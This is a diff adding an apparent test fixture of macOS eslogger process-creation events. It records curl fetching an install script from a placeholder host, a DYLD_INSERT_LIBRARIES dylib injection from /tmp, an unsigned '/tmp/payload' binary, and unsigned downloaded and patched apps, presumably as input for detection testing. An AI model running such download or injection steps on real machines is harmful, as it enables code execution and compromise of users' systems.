@@ -1,0 +1,184 @@
+[
+  {
+    "seq": 1001,
+    "time": "2026-11-07T08:00:01.001001123Z",
+    "name": "CreateProcess",
+    "source": "eslogger",
+    "proc": {
+      "pid": 4242,
+      "ppid": 4100,
+      "pidversion": 4243,
+      "uuid": 18219251273875,
+      "exe": "/usr/bin/curl",
+      "name": "curl",
+      "cmdline": "curl -fsSL https://example.invalid/install.sh",
+      "args": [
+        "curl",
+        "-fsSL",
+        "https://example.invalid/install.sh"
+      ],
+      "cwd": "/Users/alice",
+      "uid": 501,
+      "euid": 501,
+      "signing_id": "com.apple.curl",
+      "cdhash": "5a1f4e3d2c1b0a99887766554433221100ffeedd",
+      "is_platform": true,
+      "is_signed": true,
+      "tty": "/dev/ttys003",
+      "start_time": "2026-11-07T07:59:59.5Z",
+      "env": {
+        "DYLD_INSERT_LIBRARIES": "/tmp/libinject.dylib",
+        "HOME": "/Users/alice",
+        "PATH": "/usr/bin:/bin",
+        "TERM": "xterm-256color"
+      },
+      "parent": {
+        "pid": 4100,
+        "ppid": 0,
+        "pidversion": 4100,
+        "uuid": 17609365917700,
+        "exe": "",
+        "name": "",
+        "uid": 0,
+        "euid": 0,
+        "is_platform": false,
+        "is_signed": false,
+        "start_time": "0001-01-01T00:00:00Z"
+      }
+    },
+    "args": {
+      "env.DYLD_INSERT_LIBRARIES": "/tmp/libinject.dylib",
+      "prev_exe": "/bin/zsh"
+    }
+  },
+  {
+    "seq": 1002,
+    "time": "2026-11-07T08:00:02.001002123Z",
+    "name": "CreateProcess",
+    "source": "eslogger",
+    "proc": {
+      "pid": 4300,
+      "ppid": 4100,
+      "pidversion": 4301,
+      "uuid": 18468359377101,
+      "exe": "/private/tmp/payload",
+      "name": "payload",
+      "cmdline": "/private/tmp/payload",
+      "args": [
+        "/private/tmp/payload"
+      ],
+      "cwd": "/private/tmp",
+      "uid": 501,
+      "euid": 501,
+      "is_platform": false,
+      "is_signed": false,
+      "start_time": "2026-11-07T07:59:59.5Z",
+      "env": {
+        "HOME": "/Users/alice"
+      },
+      "parent": {
+        "pid": 4100,
+        "ppid": 0,
+        "pidversion": 4100,
+        "uuid": 17609365917700,
+        "exe": "",
+        "name": "",
+        "uid": 0,
+        "euid": 0,
+        "is_platform": false,
+        "is_signed": false,
+        "start_time": "0001-01-01T00:00:00Z"
+      }
+    },
+    "args": {
+      "prev_exe": "/bin/zsh",
+      "script": "/private/tmp/payload"
+    }
+  },
+  {
+    "seq": 1003,
+    "time": "2026-11-07T08:00:02.001003123Z",
+    "name": "CreateProcess",
+    "source": "eslogger",
+    "proc": {
+      "pid": 4310,
+      "ppid": 4100,
+      "pidversion": 4311,
+      "uuid": 18511309050071,
+      "exe": "/Users/alice/Downloads/tool",
+      "name": "tool",
+      "cmdline": "./tool --run",
+      "args": [
+        "./tool",
+        "--run"
+      ],
+      "cwd": "/Users/alice/Downloads",
+      "uid": 501,
+      "euid": 501,
+      "signing_id": "tool-55554944a1b2",
+      "cdhash": "5a1f4e3d2c1b0a99887766554433221100ffeedd",
+      "is_platform": false,
+      "is_signed": false,
+      "start_time": "2026-11-07T07:59:59.5Z",
+      "parent": {
+        "pid": 4100,
+        "ppid": 0,
+        "pidversion": 4100,
+        "uuid": 17609365917700,
+        "exe": "",
+        "name": "",
+        "uid": 0,
+        "euid": 0,
+        "is_platform": false,
+        "is_signed": false,
+        "start_time": "0001-01-01T00:00:00Z"
+      }
+    },
+    "args": {
+      "prev_exe": "/bin/zsh"
+    }
+  },
+  {
+    "seq": 1004,
+    "time": "2026-11-07T08:00:02.001004123Z",
+    "name": "CreateProcess",
+    "source": "eslogger",
+    "proc": {
+      "pid": 4320,
+      "ppid": 4100,
+      "pidversion": 4321,
+      "uuid": 18554258723041,
+      "exe": "/Applications/Patched.app/Contents/MacOS/Patched",
+      "name": "Patched",
+      "cmdline": "Patched",
+      "args": [
+        "Patched"
+      ],
+      "cwd": "/",
+      "uid": 501,
+      "euid": 501,
+      "signing_id": "com.example.patched",
+      "team_id": "ABCDE12345",
+      "cdhash": "5a1f4e3d2c1b0a99887766554433221100ffeedd",
+      "is_platform": false,
+      "is_signed": false,
+      "start_time": "2026-11-07T07:59:59.5Z",
+      "parent": {
+        "pid": 4100,
+        "ppid": 0,
+        "pidversion": 4100,
+        "uuid": 17609365917700,
+        "exe": "",
+        "name": "",
+        "uid": 0,
+        "euid": 0,
+        "is_platform": false,
+        "is_signed": false,
+        "start_time": "0001-01-01T00:00:00Z"
+      }
+    },
+    "args": {
+      "prev_exe": "/bin/zsh"
+    }
+  }
+]
